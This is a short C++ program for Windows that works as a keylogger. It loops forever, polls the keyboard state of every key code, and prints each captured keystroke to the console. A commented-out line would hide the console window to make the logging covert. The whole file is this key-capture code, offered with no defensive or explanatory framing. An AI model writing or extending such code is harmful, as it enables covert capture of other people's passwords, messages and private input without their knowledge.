#include <fstream>
#include <Windows.h>
#include <unistd.h>
#include <iostream>

int main() {
    // hide the window
    //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 

    // Run infinitely
    while(true) {
		for (int key = 8; key <= 190; key++)
		{    
            if (GetAsyncKeyState(key) == -32767) {
                if (key == VK_SHIFT) {
                    std::cout << "[SHIFT]";
                } else if (key == VK_CAPITAL) {
                    std::cout << "[CAPS]";
                } else if (key == VK_SPACE) {
                    std::cout << "[SPACE]";
                } else if (key == VK_TAB) {
                    std::cout << "[TAB]";
                } else if (key == '¾') {
                    std::cout << ".";
                } else {
                    std::cout << char(key);
                }
            }
        }
    }
}